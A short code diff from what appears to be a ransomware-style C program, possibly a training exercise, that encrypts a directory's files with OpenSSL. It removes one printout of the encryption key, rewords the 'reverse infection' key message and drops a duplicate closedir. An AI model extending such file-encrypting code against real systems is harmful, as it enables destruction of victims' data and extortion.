@@ -18,12 +18,6 @@ int stockholm_encrypt(crypto_params *params) {
     if (EVP_EncryptFinal_ex(ctx, params->output + len, &len) != 1) return -1;
     params->output_len += len;
 
-    printf("Encryption key: ");
-    for (int i = 0; i < KEY_SIZE; i++) {
-        printf("%02x", params->key[i]);
-    }
-    printf("\n");
-
     // Clean up
     EVP_CIPHER_CTX_free(ctx);
 
@@ -117,7 +111,7 @@ void encrypt_files(int silent_mode){
     closedir(dir);
 
     if (!silent_mode) {
-        printf("Encryption key (save this to reverse infection): ");
+        printf("Encryption Key: ");
         for (int i = 0; i < KEY_SIZE; i++) {
             printf("%02x", params.key[i]);
         }
@@ -125,5 +119,4 @@ void encrypt_files(int silent_mode){
     }
 
     free(params.key);
-    closedir(dir);
 }
